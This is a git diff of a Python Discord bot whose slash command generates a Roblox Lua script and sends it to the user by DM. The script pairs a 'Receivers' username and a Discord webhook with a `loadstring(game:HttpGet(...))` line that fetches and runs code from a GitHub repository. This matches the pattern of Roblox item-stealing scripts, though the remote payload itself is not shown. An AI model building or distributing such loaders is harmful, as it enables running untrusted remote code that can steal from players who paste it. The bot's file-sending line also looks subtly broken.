@@ -4,7 +4,7 @@ from discord.ext import commands
 from discord import app_commands
 from dotenv import load_dotenv
 
-load_dotenv()
+load_dotenv()  # Loads BOT_TOKEN from .env or Render Env
 
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
@@ -17,7 +17,6 @@ tree = bot.tree
     webhook_url="Your Discord webhook URL"
 )
 async def create_script(interaction: discord.Interaction, username: str, github_url: str, webhook_url: str):
-    # Validation
     if not github_url.startswith("https://raw.githubusercontent.com/"):
         await interaction.response.send_message("❌ GitHub raw URL must start with `https://raw.githubusercontent.com/`", ephemeral=True)
         return
@@ -26,7 +25,6 @@ async def create_script(interaction: discord.Interaction, username: str, github_
         await interaction.response.send_message("❌ Invalid Discord webhook URL.", ephemeral=True)
         return
 
-    # The final Lua script content
     lua_script = f'''
 Config = {{
   Receivers = {{"{username}"}},
@@ -38,13 +36,9 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PRXJECT-DEV/GLOBAL-BO
 '''.strip()
 
     try:
-        # Send DM
         dm = await interaction.user.create_dm()
-
-        # 1. Plain text message
         await dm.send("✅ Here's your Roblox script (copy/paste version):\n```lua\n" + lua_script + "\n```")
 
-        # 2. As a downloadable file (PC users)
         file = discord.File(fp=bytes(lua_script, 'utf-8'), filename="generated_script.lua")
         await dm.send("💾 PC Users: Download the `.lua` file below.", file=file)
 
